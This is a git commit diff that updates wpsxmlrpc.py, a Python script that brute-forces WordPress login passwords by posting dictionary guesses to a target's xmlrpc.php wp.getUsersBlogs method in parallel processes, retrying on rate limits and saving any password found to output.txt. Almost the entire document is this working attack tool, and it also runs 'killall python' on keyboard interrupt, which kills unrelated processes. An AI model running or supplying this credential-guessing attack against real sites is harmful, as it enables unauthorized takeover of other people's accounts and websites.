6549ee841ea4cd6ab84a444565abb2a5bd36da7d
lupin <mail@lp1.eu>
2015-05-18 16:09:43 +0000

    Updated thread

--- wpsxmlrpc.py
+++ wpsxmlrpc.py
@@ -1,17 +1,39 @@
 from sys import argv, exit
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ProcessPoolExecutor
+from threading import active_count
+from os.path import isfile
+from os import system
+from time import sleep
 import requests
+import concurrent.futures
 
-def make_request(login, password, url):
-    url += "/xmlrpc.php"
-    payload = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value> <string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>" %(login, password)
-    r = requests.post(url, data=payload)
-    if "403" not in r.text:
-        print("Password is found and was %s") %password
-        print(r.text)
-        exit(0)
-    else:
-        print("Password %s is invalid" %password)
+sleep_time = 0.1
+
+def make_request(login, password, url, index, length):
+    try:
+        payload = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value> <string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>" %(login, password)
+        r = requests.post(url, data=payload, timeout=1.5)
+
+        if "isAdmin" in r.text:
+            with open("output.txt", "a+") as f:
+                f.write("password for %s was %s" %(url, password))
+                f.close()
+            print("\033[32mPassword is found and was %s\033[32m") %password
+            print(r.text)
+            exit(0)
+        if "503" in r.text: 
+            sleep(sleep_time)
+            make_request(login, password, url, index, length)
+            exit(0)
+        print("\033[33m[%i/%i] %d%% : %s [false]\033[33m" %(index, length, (float(index) / float(length)) * 100.0 , password))
+    except KeyboardInterrupt as e: 
+        system("killall python")
+    except Exception as e:
+        print(e)
+        sleep(sleep_time)
+        make_request(login, password, url, index, length)
+        exit(-1)
+    return 0
 
 def usage():
     print("Usage : %s -t http://target -l login -d dictionnary.txt [--threads number_of_threads]" %argv[0])
@@ -40,7 +62,7 @@ def get_parameters():
         if param == "--max-threads":
             if argv.index(param) + 2 > len(argv) or argv[argv.index(param) + 1][0] == '-':
                 exit(usage())
-            max_threads = argv[argv.index(param) + 1]    
+            max_threads = int(argv[argv.index(param) + 1])    
     return url, login, max_threads, dico_file
 
 def get_dico(dico_file):
@@ -48,14 +70,23 @@ def get_dico(dico_file):
     with open(dico_file, "r") as f:
         for line in f.readlines():
             array.append(line.replace("\n", ""))
+        f.close()
     return array
 
 def main():
     url, login, max_threads, dico_file = get_parameters()
-    for password in get_dico(dico_file):
-        with ThreadPoolExecutor(max_workers=max_threads) as e:
-            e.submit(make_request, login, password, url)
+    dico = get_dico(dico_file)
+    print(max_threads)
+    with ProcessPoolExecutor(max_workers=max_threads) as e:
+        for password in dico:
+            if isfile("output.txt"):
+                exit(0)
+            thread = [e.submit(make_request, login, password, url+"/xmlrpc.php", dico.index(password), len(dico))]
+            sleep(sleep_time)
     return 0
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        exit(0)
